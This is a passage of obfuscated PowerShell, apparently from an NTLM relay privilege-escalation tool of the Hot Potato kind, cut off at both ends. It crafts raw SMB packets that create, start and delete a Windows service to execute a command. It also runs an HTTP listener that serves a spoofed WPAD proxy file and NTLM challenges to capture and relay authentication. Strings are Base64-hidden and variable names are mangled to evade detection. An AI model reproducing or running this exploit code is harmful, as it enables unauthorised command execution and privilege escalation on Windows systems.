            ${_/\/=\/=\_/\/\__/} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))
        }    
        [Byte[]] ${/=\__/\_/\/=\/\/=} = ${_/\/=\/=\_/\/\__/}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${_/=\_/\/=======\/} = [System.BitConverter]::GetBytes(${/=\__/\_/\/=\/\/=}.Length + ${_/\_/\____/\/=\__}.Length + 237)
        ${_/=\_/\/=======\/} = ${_/=\_/\/=======\/}[2..0]
        ${/=\/\/\/=====\/==} = [System.BitConverter]::GetBytes(${/=\__/\_/\/=\/\/=}.Length + ${_/\_/\____/\/=\__}.Length + 174)
        ${/=\/\/\/=====\/==} = ${/=\/\/\/=====\/==}[0..1]   
        ${/=\/====\/\______} = [System.BitConverter]::GetBytes(${/=\__/\_/\/=\/\/=}.Length / 2)
        ${_/=\/\__/==\__/\/} = 0
        :SMB_relay_execute_loop while (${_/=\/\__/==\__/\/} -lt 12)
        {
            switch (${_/=\/\__/==\__/\/})
            {
                0
                {
                    ${/===\/\__/==\__/\} = 0x00,0x00,0x00,0x45,0xff,0x53,0x4d,0x42,0x75,0x00,0x00,0x00,0x00,
                                              0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0xff,0xff +
                                              ${__/\__/\/=\___/==}.process_ID_bytes +
                                              ${___/\/=\/==\__/\_/} +
                                              0x00,0x00,0x04,0xff,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x1a,0x00,
                                              0x00,0x5c,0x5c,0x31,0x30,0x2e,0x31,0x30,0x2e,0x32,0x2e,0x31,0x30,
                                              0x32,0x5c,0x49,0x50,0x43,0x24,0x00,0x3f,0x3f,0x3f,0x3f,0x3f,0x00
                }
                1
                {
                    ${/===\/\__/==\__/\} = 0x00,0x00,0x00,0x5b,0xff,0x53,0x4d,0x42,0xa2,0x00,0x00,0x00,0x00,
                                              0x18,0x02,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x08 +
                                              ${__/\__/\/=\___/==}.process_ID_bytes +
                                              ${___/\/=\/==\__/\_/} +
                                              0x03,0x00,0x18,0xff,0x00,0x00,0x00,0x00,0x07,0x00,0x16,0x00,0x00,
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x01,
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x08,
                                              0x00,0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00
                }
                2
                {
                    ${/===\/\__/==\__/\} = 0x00,0x00,0x00,0x87,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
                                              0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x08 +
                                              ${__/\__/\/=\___/==}.process_ID_bytes +
                                              ${___/\/=\/==\__/\_/} +
                                              0x04,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,
                                              0xff,0xff,0xff,0xff,0x08,0x00,0x48,0x00,0x00,0x00,0x48,0x00,0x3f,
                                              0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x05,0x00,0x0b,0x03,0x10,0x00,
                                              0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xd0,0x16,0xd0,
                                              0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,
                                              0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,
                                              0x00,0x10,0x03,0x02,0x00,0x00,0x00,0x04,0x5d,0x88,0x8a,0xeb,0x1c,
                                              0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60,0x02,0x00,0x00,
                                              0x00
                    ${____/\/====\/===\} = 0x05
                }
                3
                { 
                    ${/===\/\__/==\__/\} = ${/=\__/==\/====\_/}
                }
                4
                {
                    ${/===\/\__/==\__/\} = 0x00,0x00,0x00,0x9b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
                                              0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x08 +
                                              ${__/\__/\/=\___/==}.process_ID_bytes +
                                              ${___/\/=\/==\__/\_/} +
                                              0x06,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,
                                              0xff,0xff,0xff,0xff,0x08,0x00,0x50,0x00,0x00,0x00,0x5c,0x00,0x3f,
                                              0x00,0x00,0x00,0x00,0x00,0x5c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,
                                              0x00,0x00,0x5c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x38,0x00,0x00,
                                              0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x03,0x00,0x15,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
                                              ${_/\_/\____/\/=\__} +
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x3f,0x00,0x0f,0x00
                    ${____/\/====\/===\} = 0x07
                }
                5
                {  
                    ${/===\/\__/==\__/\} = ${/=\__/==\/====\_/}
                }
                6
                {
                    ${/===\/\__/==\__/\} = [Array]0x00 +
                                              ${_/=\_/\/=======\/} +
                                              0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28,0x00,
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08 +
                                              ${__/\__/\/=\___/==}.process_ID_bytes +
                                              ${___/\/=\/==\__/\_/} +
                                              0x08,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,
                                              0xff,0xff,0xff,0xff,0x08,0x00 +
                                              ${/=\/\/\/=====\/==} +
                                              0x00,0x00 +
                                              ${/=\/\/\/=====\/==} +
                                              0x3f,0x00,0x00,0x00,0x00,0x00 +
                                              ${/=\/\/\/=====\/==} +
                                              0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00 +
                                              ${/=\/\/\/=====\/==} +
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,
                                              0x00 +
                                              ${/==\_/\_/\/\/\_/\} +
                                              0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
                                              ${_/\_/\____/\/=\__} +
                                              0x00,0x00 +
                                              ${/====\/=\/==\/==\} +
                                              0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
                                              ${_/\_/\____/\/=\__} +
                                              0x00,0x00,0xff,0x01,0x0f,0x00,0x10,0x01,0x00,0x00,0x03,0x00,0x00,
                                              0x00,0x00,0x00,0x00,0x00 +
                                              ${/=\/====\/\______} +
                                              0x00,0x00,0x00,0x00 +
                                              ${/=\/====\/\______} +
                                              ${/=\__/\_/\/=\/\/=} +
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00
                    ${____/\/====\/===\} = 0x09
                }
                7
                {
                    ${/===\/\__/==\__/\} = ${/=\__/==\/====\_/}
                }
                8
                {
                    ${/===\/\__/==\__/\} = 0x00,0x00,0x00,0x73,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
                                              0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x08 +
                                              ${__/\__/\/=\___/==}.process_ID_bytes +
                                              ${___/\/=\/==\__/\_/} +
                                              0x0a,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,
                                              0xff,0xff,0xff,0xff,0x08,0x00,0x34,0x00,0x00,0x00,0x34,0x00,0x3f,
                                              0x00,0x00,0x00,0x00,0x00,0x34,0x00,0x05,0x00,0x00,0x03,0x10,0x00,
                                              0x00,0x00,0x34,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,
                                              0x00,0x00,0x00,0x13,0x00 +
                                              ${/==\_/\_/\/\/\_/\} +
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                }
                9
                {
                    ${/===\/\__/==\__/\} = ${/=\__/==\/====\_/}
                }
                10
                { 
                    ${/===\/\__/==\__/\} = 0x00,0x00,0x00,0x6b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
                                              0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x08 +
                                              ${__/\__/\/=\___/==}.process_ID_bytes +
                                              ${___/\/=\/==\__/\_/} +
                                              0x0b,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x0b,0x01,0x00,0x00,
                                              0xff,0xff,0xff,0xff,0x08,0x00,0x2c,0x00,0x00,0x00,0x2c,0x00,0x3f,
                                              0x00,0x00,0x00,0x00,0x00,0x2c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,
                                              0x00,0x00,0x2c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0x00,0x00,
                                              0x00,0x00,0x00,0x02,0x00 +
                                              ${/==\_/\_/\/\/\_/\}
                }
                11
                {
                    ${/===\/\__/==\__/\} = ${/=\__/==\/====\_/}
                }
            }
            ${/=====\__/==\_/\_}.Write(${/===\/\__/==\__/\},0,${/===\/\__/==\__/\}.Length)
            ${/=====\__/==\_/\_}.Flush()
            if (${_/=\/\__/==\__/\/} -eq 5) 
            {
                ${/=====\__/==\_/\_}.Read(${__/=\____/\_/===\},0,${__/=\____/\_/===\}.Length)
                ${/==\_/\_/\/\/\_/\} = ${__/=\____/\_/===\}[88..107]
                if(([System.BitConverter]::ToString(${__/=\____/\_/===\}[108..111]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))) -and ([System.BitConverter]::ToString(${/==\_/\_/\/\/\_/\}) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))))
                {
                }
                elseif([System.BitConverter]::ToString(${__/=\____/\_/===\}[108..111]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAA1AC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                {
                    ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - ${/==\/===\/=\/====}\" + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAF8ALwA9AD0AXAAvAFwALwA9AFwALwA9AFwAXwB9ACAAaQBzACAAbgBvAHQAIABhACAAbABvAGMAYQBsACAAYQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAgAG8AbgAgAA=='))) + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAC8APQBcAC8AXABfAC8APQBcAF8AXwBfAF8ALwB9AA=='))))
                    ${__/\/===\_____/\_} = $true
                }
                else
                {
                    ${__/\/===\_____/\_} = $true
                }
            }
            elseif (${_/=\/\__/==\__/\/} -eq 7 -or ${_/=\/\__/==\__/\/} -eq 9 -or ${_/=\/\__/==\__/\/} -eq 11)
            {
                ${/=====\__/==\_/\_}.Read(${__/=\____/\_/===\},0,${__/=\____/\_/===\}.Length)
                switch(${_/=\/\__/==\__/\/})
                {
                    7 {
                        ${/==\_/\_/\/\/\_/\} = ${__/=\____/\_/===\}[92..111]
                        ${_/\/\__/=\_/\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAGMAcgBlAGEAdABpAG8AbgAgAGYAYQB1AGwAdAAgAGMAbwBuAHQAZQB4AHQAIABtAGkAcwBtAGEAdABjAGgA')))
                    }
                    11 {
                        ${_/\/\__/=\_/\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAHMAdABhAHIAdAAgAGYAYQB1AGwAdAAgAGMAbwBuAHQAZQB4AHQAIABtAGkAcwBtAGEAdABjAGgA')))
                    }
                    13 {
                        ${_/\/\__/=\_/\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAGQAZQBsAGUAdABpAG8AbgAgAGYAYQB1AGwAdAAgAGMAbwBuAHQAZQB4AHQAIABtAGkAcwBtAGEAdABjAGgA')))
                    }
                }
                if([System.BitConverter]::ToString(${/==\_/\_/\/\/\_/\}[0..3]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                {
                    ${__/\/===\_____/\_} = $true
                }
                if([System.BitConverter]::ToString(${__/=\____/\_/===\}[88..91]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQBhAC0AMAAwAC0AMAAwAC0AMQBjAA=='))))
                {
                    ${__/\__/\/=\___/==}.console_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAC8AXABfAF8ALwA9AFwAXwAvAFwAXwAvAD0AXAB9ACAAcwBlAHIAdgBpAGMAZQAgAG8AbgAgACQAewBfAC8AXAAvAD0AXAAvAFwAXwAvAD0AXABfAF8AXwBfAC8AfQA='))))
                    ${__/\/===\_____/\_} = $true
                }
            }        
            else
            {
                ${/=====\__/==\_/\_}.Read(${__/=\____/\_/===\},0,${__/=\____/\_/===\}.Length)    
            }
            if(!${__/\/===\_____/\_} -and ${_/=\/\__/==\__/\/} -eq 7)
            {
                ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - SMB relay service ${__/====\/==\__/\/} created on ${_/\/=\/\_/=\____/}")
            }
            elseif(!${__/\/===\_____/\_} -and ${_/=\/\__/==\__/\/} -eq 9)
            {
                ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Command likely executed on ${_/\/=\/\_/=\____/}")
            }
            elseif(!${__/\/===\_____/\_} -and ${_/=\/\__/==\__/\/} -eq 11)
            {
                ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - SMB relay service ${__/====\/==\__/\/} deleted on ${_/\/=\/\_/=\____/}")
            }   
            ${/=\__/==\/====\_/} = 0x00,0x00,0x00,0x37,0xff,0x53,0x4d,0x42,0x2e,0x00,0x00,0x00,0x00,
                                                0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x08 +
                                                ${__/\__/\/=\___/==}.process_ID_bytes +
                                                ${___/\/=\/==\__/\_/} +
                                                ${____/\/====\/===\} +
                                                0x00,0x0a,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x58,
                                                0x02,0x58,0x02,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00
            if(${__/\/===\_____/\_})
            {
                ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - SMB relay failed on ${_/\/=\/\_/=\____/}")
                BREAK SMB_relay_execute_loop
            }
            ${_/=\/\__/==\__/\/}++
        }
        ${__/\__/\/=\___/==}.SMB_relay_active_step = 0
        ${_/===\___/=\/\_/==}.Close()
        if(!${__/\/===\_____/\_})
        {
            ${__/\__/\/=\___/==}.SMBRelay_success = $True
        }
    }
}
${/===\/\__/\/=\/==} = 
{
    param ($Command,$HTTPPort,$WPADDirectHosts,$WPADPort)
    function _/==\/=\__/\/\/\/=
    {
        ${_/===\____/\___/\} = Get-Date
        ${_/===\____/\___/\} = ${_/===\____/\___/\}.ToFileTime()
        ${_/===\____/\___/\} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${_/===\____/\___/\}))
        ${_/===\____/\___/\} = ${_/===\____/\___/\}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${________/\___/\/=} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,
                           0x00,0x00,0x00,0x05,0xc2,0x89,0xa2 +
                           $HTTP_challenge_bytes +
                           0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,
                           0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00,0x02,0x00,0x06,0x00,
                           0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,
                           0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00,0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,
                           0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,
                           0x00,0x68,0x00,0x6f,0x00,0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,
                           0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,
                           0x00,0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,
                           0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00 +
                           ${_/===\____/\___/\} +
                           0x00,0x00,0x00,0x00,0x0a,0x0a
        ${/=\/=\/\/\__/=\__} = [System.Convert]::ToBase64String(${________/\___/\/=})
        ${_/=====\__/\/==\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA=='))) + ${/=\/=\/\/\__/=\__}
        ${/==\_/==\_/\__/\/} = $HTTP_challenge
        return ${_/=====\__/\/==\/}
    }
    ${_/\/=\/\_/=\____/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAyADcALgAwAC4AMAAuADEA')))
    ${_/====\/\_/\/===\} = [System.Text.Encoding]::UTF8.GetBytes($HTTPPort)
    $WPADDirectHosts += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAYQBsAGgAbwBzAHQA')))
    ${___/\_/=\/=\/==\_} = $WPADPort.Length + 62
    foreach(${/=\_/\/=\_/\_/===} in $WPADDirectHosts)
    {
        ${___/\_/=\/=\/==\_} += ${/=\_/\/=\_/\_/===}.Length + 43
        ${_/\_____/=\___/\/} = [System.Text.Encoding]::UTF8.GetBytes(${___/\_/=\/=\/==\_})
        ${/===\__/=\__/\__/} = [System.Text.Encoding]::UTF8.GetBytes(${/=\_/\/=\_/\_/===})
        ${___/\____/==\/=\_} = 0x69,0x66,0x20,0x28,0x64,0x6e,0x73,0x44,0x6f,0x6d,0x61,0x69,0x6e,0x49,
                                           0x73,0x28,0x68,0x6f,0x73,0x74,0x2c,0x20,0x22 +
                                           ${/===\__/=\__/\__/} +
                                           0x22,0x29,0x29,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x44,0x49,
                                           0x52,0x45,0x43,0x54,0x22,0x3b 
        ${/====\/===\_/==\_} += ${___/\____/==\/=\_}
    }
    ${__/=\/==\/=====\/} = [System.Text.Encoding]::UTF8.GetBytes($WPADPort)
    :HTTP_listener_loop while (${__/\__/\/=\___/==}.running)
    {
        if(${__/\__/\/=\___/==}.SMBRelay_success)
        {
            ___/====\/\/\_/=\/
        }
        ${_/\___/==\/==\___} = $NULL
        ${__/=\/\___/\/\/\/} = New-Object System.Byte[] 1024
        ${_/\__/=\_/====\_/} = $false
        while(!${__/\__/\/=\___/==}.HTTP_listener.Pending() -and !${__/\__/\/=\___/==}.HTTP_client.Connected)
        {
            if(!${_/\__/=\_/====\_/})
            {
                ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Waiting for incoming HTTP connection")
                ${_/\__/=\_/====\_/} = $true
            }
            sleep -s 1
            if(${__/\__/\/=\___/==}.SMBRelay_success)
            {
                ___/====\/\/\_/=\/
            }
        }
        if(!${__/\__/\/=\___/==}.HTTP_client.Connected)
        {
            ${__/\__/\/=\___/==}.HTTP_client = ${__/\__/\/=\___/==}.HTTP_listener.AcceptTcpClient()
	        ${_/=\_/==\_/=====\} = ${__/\__/\/=\___/==}.HTTP_client.GetStream() 
        }
        while (${_/=\_/==\_/=====\}.DataAvailable)
        {
            ${_/=\_/==\_/=====\}.Read(${__/=\/\___/\/\/\/},0,${__/=\/\___/\/\/\/}.Length)
        }
        ${_/\___/==\/==\___} = [System.BitConverter]::ToString(${__/=\/\___/\/\/\/})
        if(${_/\___/==\/==\___} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA3AC0ANAA1AC0ANQA0AC0AMgAwACoA'))) -or ${_/\___/==\/==\___} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA4AC0ANAA1AC0ANAAxAC0ANAA0AC0AMgAwACoA'))) -or ${_/\___/==\/==\___} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABmAC0ANQAwAC0ANQA0AC0ANAA5AC0ANABmAC0ANABlAC0ANQAzAC0AMgAwACoA'))))
        {
            ${/=\/=====\/\/===\} = ${_/\___/==\/==\___}.Substring(${_/\___/==\/==\___}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAyADAALQA=')))) + 4,${_/\___/==\/==\___}.Substring(${_/\___/==\/==\___}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAyADAALQA=')))) + 1).IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAyADAALQA=')))) - 3)
            ${/=\/=====\/\/===\} = ${/=\/=====\/\/===\}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
            ${__/\__/\/=\___/==}.request_RawUrl = New-Object System.String (${/=\/=====\/\/===\},0,${/=\/=====\/\/===\}.Length)
            if(${__/\__/\/=\___/==}.request_RawUrl -eq "")
            {
                ${__/\__/\/=\___/==}.request_RawUrl = "/"
            }
        }
        if(${_/\___/==\/==\___} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAtADQAMQAtADcANQAtADcANAAtADYAOAAtADYARgAtADcAMgAtADYAOQAtADcAQQAtADYAMQAtADcANAAtADYAOQAtADYARgAtADYARQAtADMAQQAtADIAMAAtACoA'))))
        {
            ${/=\_/=\_/\_/\/=\_} = ${_/\___/==\/==\___}.Substring(${_/\___/==\/==\___}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA0ADEALQA3ADUALQA3ADQALQA2ADgALQA2AEYALQA3ADIALQA2ADkALQA3AEEALQA2ADEALQA3ADQALQA2ADkALQA2AEYALQA2AEUALQAzAEEALQAyADAALQA=')))) + 46)
            ${/=\_/=\_/\_/\/=\_} = ${/=\_/=\_/\_/\/=\_}.Substring(0,${/=\_/=\_/\_/\/=\_}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwAEQALQAwAEEALQA=')))))
            ${/=\_/=\_/\_/\/=\_} = ${/=\_/=\_/\_/\/=\_}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
            ${/=\_/\____/=\/\/=} = New-Object System.String (${/=\_/=\_/\_/\/=\_},0,${/=\_/=\_/\_/\/=\_}.Length)
        }
        else
        {
            ${/=\_/\____/=\/\/=} =  ''
        }
        ${/=\_____/\/=\/\__} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAA=')))
        ${/=\___/\____/==\/} = ""
        if (${__/\__/\/=\___/==}.request_RawUrl -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))))
        {
            ${__/\__/\/=\___/==}.response_StatusCode = 0x32,0x30,0x30
            ${/=\_/\/\/=\_/=\/=} = 0x4f,0x4b
            ${______/\____/\/=\} = 0x66,0x75,0x6e,0x63,0x74,0x69,0x6f,0x6e,0x20,0x46,0x69,0x6e,0x64,0x50,0x72,
                                  0x6f,0x78,0x79,0x46,0x6f,0x72,0x55,0x52,0x4c,0x28,0x75,0x72,0x6c,0x2c,0x68,
                                  0x6f,0x73,0x74,0x29,0x7b +
                                  ${/====\/===\_/==\_} +
                                  0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x50,0x52,0x4f,0x58,0x59,0x20,0x31,
                                  0x32,0x37,0x2e,0x30,0x2e,0x30,0x2e,0x31,0x3a +
                                  ${__/=\/==\/=====\/} +
                                  0x22,0x3b,0x7d
            ${_/=====\__/\/==\/} = ''
            ${/=\___/\____/==\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBQAEEARAA=')))
        }
        elseif (${__/\__/\/=\___/==}.request_RawUrl -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBHAEUAVABIAEEAUwBIAEUAUwA='))))
        {
            ${__/\__/\/=\___/==}.response_StatusCode = 0x34,0x30,0x31
            ${/=\_/\/\/=\_/=\/=} = 0x4f,0x4b
            ${_/=====\__/\/==\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
            ${/=\___/\____/==\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
        }
        else
        {
            ${__/\__/\/=\___/==}.response_StatusCode = 0x33,0x30,0x32
            ${/==\/==\_/\/\/=\_} = 0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,0x20,0x70,0x72,
                             0x69,0x76,0x61,0x74,0x65,0x0d,0x0a,0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,
                             0x70,0x65,0x3a,0x20,0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,
                             0x61,0x72,0x73,0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a,0x45,0x78,0x70,0x69,
                             0x72,0x65,0x73,0x3a,0x20,0x4d,0x6f,0x6e,0x2c,0x20,0x30,0x31,0x20,0x4a,0x61,0x6e,0x20,
                             0x30,0x30,0x30,0x31,0x20,0x30,0x30,0x3a,0x30,0x30,0x3a,0x30,0x30,0x20,0x47,0x4d,0x54,
                             0x0d,0x0a,0x4c,0x6f,0x63,0x61,0x74,0x69,0x6f,0x6e,0x3a,0x20,0x68,0x74,0x74,0x70,0x3a,
                             0x2f,0x2f,0x6c,0x6f,0x63,0x61,0x6c,0x68,0x6f,0x73,0x74,0x3a +
                             ${_/====\/\_/\/===\} +
                             0x2f,0x47,0x45,0x54,0x48,0x41,0x53,0x48,0x45,0x53,0x0d,0x0a
            ${/=\_/\/\/=\_/=\/=} = 0x4f,0x4b
            ${_/=====\__/\/==\/} = ''
            ${/=\___/\____/==\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGQAaQByAGUAYwB0AA==')))
            if(${__/\__/\/=\___/==}.HTTP_client_handle_old -ne ${__/\__/\/=\___/==}.HTTP_client.Client.Handle)
            {
                ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - Attempting to redirect to http://localhost:" + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABIAFQAVABQAFAAbwByAHQALwBnAGUAdABoAGEAcwBoAGUAcwAgAGEAbgBkACAAdAByAGkAZwBnAGUAcgAgAHIAZQBsAGEAeQA='))))
            }
        }
        if((${__/\__/\/=\___/==}.request_RawUrl_old -ne ${__/\__/\/=\___/==}.request_RawUrl -and ${__/\__/\/=\___/==}.HTTP_client_handle_old -ne ${__/\__/\/=\___/==}.HTTP_client.Client.Handle) -or ${__/\__/\/=\___/==}.HTTP_client_handle_old -ne ${__/\__/\/=\___/==}.HTTP_client.Client.Handle)
        {
            ${__/\__/\/=\___/==}.console_queue.Add("$(Get-Date -format 's') - ${/=\_____/\/=\/\__} request for " + ${__/\__/\/=\___/==}.request_RawUrl + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAByAGUAYwBlAGkAdgBlAGQAIABmAHIAbwBtACAA'))) + ${__/\__/\/=\___/==}.HTTP_client.Client.RemoteEndpoint.Address)
        }
        if(${/=\_/\____/=\/\/=}.StartsWith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA==')))))
        {
